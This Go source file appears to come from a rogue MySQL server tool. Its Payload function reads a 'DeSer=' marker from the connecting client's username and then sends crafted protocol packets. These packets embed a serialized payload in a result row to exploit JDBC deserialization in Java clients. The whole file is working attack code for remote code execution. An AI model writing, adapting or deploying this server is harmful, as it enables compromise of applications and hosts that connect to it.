package conn

import (
	"ApricusFakemysql/core/payload"
	"ApricusFakemysql/core/proto"
	"ApricusFakemysql/core/utils"
	"log"
	"net"
)

func Payload(Username string, clientSocket net.Conn) {
	IfRce, PayloadValue := utils.CheckAndRemove(Username, "DeSer=")
	if !IfRce || PayloadValue == "" {
		return
	}
	log.Print("mode: JDBC Deserialization Start")
	PostClientData(clientSocket, proto.NewPacket(5, []byte{0x03}))
	PostClientData(clientSocket, proto.NewPacket(2, proto.NewOptionByte("a")))
	PostClientData(clientSocket, proto.NewPacket(3, proto.NewOptionByte("b")))
	PostClientData(clientSocket, proto.NewPacket(4, proto.NewOptionByte("c")))
	PostClientData(clientSocket, proto.NewPacket(5, EOF))

	data := payload.NewPayload(PayloadValue)
	PostClientData(clientSocket, proto.NewPacket(6, proto.NewOptionBytes([][]byte{[]byte("111"), data, []byte("222")})))
	PostClientData(clientSocket, proto.NewPacket(7, EOF))
}
